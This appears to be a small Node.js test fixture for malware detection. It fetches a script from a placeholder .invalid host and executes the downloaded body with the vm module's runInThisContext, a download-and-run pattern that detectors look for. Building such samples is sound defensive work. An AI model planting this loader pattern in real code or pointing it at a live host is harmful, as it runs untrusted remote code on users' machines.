// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: the chunks of an https response are collected and run with the vm module.
// Host is a non-existent .invalid domain.
const vm = require("vm");
const https = require("https");

https.get("https://dl.example.invalid/s.js", (res) => {
  const chunks = [];
  res.on("data", (c) => chunks.push(c));
  res.on("end", () => {
    const body = Buffer.concat(chunks).toString("utf8");
    vm.runInThisContext(body);
  });
});
